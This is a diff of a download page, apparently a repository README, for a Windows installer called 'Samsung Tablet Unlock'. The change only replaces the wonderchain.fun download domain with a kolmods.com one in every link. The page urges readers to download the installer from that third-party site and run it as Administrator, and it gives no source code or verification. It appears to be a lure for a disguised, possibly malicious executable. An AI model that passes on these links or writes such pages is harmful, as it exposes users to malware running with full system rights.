@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Samsung Tablet Unlock** for Windows.
 
 <p align="center">
-  <a href="https://tabletunlock.wonderchain.fun/">
+  <a href="https://tabletunlock.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Samsung%20Tablet%20Unlock-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Samsung Tablet Unlock">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[tabletunlock.wonderchain.fun](https://tabletunlock.wonderchain.fun/)** |
-| **Full URL** | `https://tabletunlock.wonderchain.fun/` |
+| **Direct link** | **[tabletunlock.kolmods.com](https://tabletunlock.kolmods.com/)** |
+| **Full URL** | `https://tabletunlock.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — tabletunlock.wonderchain.fun](https://tabletunlock.wonderchain.fun/)** (link above)
+1. Click **[Download — tabletunlock.kolmods.com](https://tabletunlock.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://tabletunlock.wonderchain.fun/"><strong>⬇ Download Samsung Tablet Unlock now</strong></a></p>
+<p align="center"><a href="https://tabletunlock.kolmods.com/"><strong>⬇ Download Samsung Tablet Unlock now</strong></a></p>
 
 ---
 
